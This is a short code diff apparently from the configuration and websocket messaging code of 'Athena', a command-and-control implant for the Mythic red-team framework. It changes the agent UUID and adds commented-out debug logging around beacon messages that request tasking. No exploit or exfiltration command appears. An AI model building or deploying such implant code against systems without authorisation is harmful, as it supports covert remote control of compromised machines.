@@ -28,7 +28,7 @@ namespace Athena.Config
             //int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
             //this.jitter = jitter;
             //this.currentConfig = new Websocket(this.uuid);
-            this.uuid = "526cef59-f8a9-4473-a7e0-04e45a6de1f5";
+            this.uuid = "e8e0ee61-089e-4820-a263-c1277c369307";
             this.killDate = DateTime.Parse("2022-08-25");
             int sleep = int.TryParse("0", out sleep) ? sleep : 60;
             this.sleep = sleep;
@@ -104,6 +104,12 @@ namespace Athena.Config
             try
             {
                 string json = JsonConvert.SerializeObject(obj);
+
+                //if (json != "{\"action\":\"get_tasking\",\"tasking_size\":-1,\"delegates\":[]}")
+                //{
+                //    Console.WriteLine(json);
+                //}
+
                 if (Globals.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -112,6 +118,7 @@ namespace Athena.Config
                 {
                     json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
+
                 WebSocketMessage m = new WebSocketMessage()
                 {
                     Client = true,
